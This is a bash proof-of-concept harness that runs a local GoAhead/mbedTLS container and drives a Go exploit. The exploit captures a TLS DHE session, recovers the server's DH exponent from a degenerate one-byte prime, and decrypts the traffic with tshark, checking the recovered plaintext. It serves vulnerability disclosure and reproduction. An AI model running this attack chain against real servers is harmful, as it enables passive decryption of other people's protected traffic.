#!/bin/bash
set -euo pipefail

IMAGE=goahead-mbedtls-dh
NAME=${NAME:-goahead-mbedtls-dh}
PORT=${PORT:-4446}
PCAP=/tmp/goahead-dh.pcap
BIN=/tmp/goahead-dh-exploit

cleanup() {
    docker rm -f $NAME >/dev/null 2>&1 || true
}
trap cleanup EXIT

fail() {
    echo "FAIL: $1"
    echo "RESULT: failed"
    exit 1
}

if [ "${REBUILD:-0}" = "1" ] || ! docker image inspect $IMAGE >/dev/null 2>&1; then
    docker build --platform linux/amd64 -t $IMAGE . -q
fi

docker rm -f $NAME >/dev/null 2>&1 || true
docker run --platform linux/amd64 -d --name $NAME -p $PORT:443 $IMAGE >/dev/null
for i in $(seq 1 30); do
    docker logs $NAME 2>&1 | grep -q 'Started https' && break
    sleep 1
done

(cd exploit && go build -o $BIN .)
rm -f $PCAP $PCAP.keys
CAPTURE=$($BIN -capture $PCAP localhost:$PORT)
ATTACK=$($BIN -attack $PCAP)

RECORDS=$(sed -n 's/.*: \([0-9]*\) records.*/\1/p' <<< "$CAPTURE")
X=$(sed -n 's/.*x=\([0-9]*\).*/\1/p' <<< "$ATTACK")
TRIES=$(sed -n 's/.*(\([0-9]*\) tries).*/\1/p' <<< "$ATTACK")
MASTER=$(cut -d' ' -f3 $PCAP.keys | cut -c1-16)

SKE=$(tshark -r $PCAP -Y 'tls.handshake.type == 12' -V 2>/dev/null)
P_LEN=$(sed -n 's/^ *p Length: //p' <<< "$SKE")
P_VAL=$(sed -n 's/^ *p: //p' <<< "$SKE")

PLAIN=$(tshark -r $PCAP -Y http 2>/dev/null | wc -l | tr -d ' ')
REQ=$(tshark -r $PCAP -o tls.keylog_file:$PCAP.keys -Y http.request \
    -T fields -e http.request.method -e http.request.uri 2>/dev/null | tr '\t' ' ')
RESP=$(tshark -r $PCAP -o tls.keylog_file:$PCAP.keys -Y http.response \
    -T fields -e http.response.code -e http.file_data 2>/dev/null)
CODE=$(cut -f1 <<< "$RESP")
BODY=$(printf '%b' "$(cut -f2 <<< "$RESP" | sed 's/../\\x&/g')")
BODY=${BODY%$'\n'}

echo "GoAhead 6.1.0 + mbedTLS 3.6.6"
echo "TLS 1.2 DHE-RSA-AES256-GCM-SHA384"
echo "------------------------------------------------------------"
echo "captured   $RECORDS TLS records (handshake + application data)"
echo
echo "ServerKeyExchange"
echo "  dh_p length  $P_LEN byte      expected 256"
echo "  dh_p value   0x$P_VAL"
echo
echo "recovered from the capture alone"
echo "  server DH exponent  x=$X ($TRIES guesses)"
echo "  master secret       ${MASTER}... -> $PCAP.keys"
echo
echo "decrypted"
echo "  > $REQ"
echo "  < HTTP $CODE"
echo "  < $BODY"
echo

[ -n "$RECORDS" ] || fail "capture produced no records"
[ "$P_LEN" = "1" ] || fail "dh_p length is '$P_LEN', expected 1"
[ "$P_VAL" = "ff" ] || fail "dh_p value is '$P_VAL', expected ff"
[ -n "$X" ] || fail "server DH exponent was not recovered"
[ "$PLAIN" = "0" ] || fail "capture is readable without the keylog"
[ "$REQ" = "GET /index.html" ] || fail "unexpected request '$REQ'"
[ "$CODE" = "200" ] || fail "unexpected response code '$CODE'"
[ "$BODY" = "MUTUAL-TLS-PROTECTED-CONTENT" ] || fail "unexpected body '$BODY'"

echo "RESULT: captured TLS session decrypted; no MITM, no server private key"
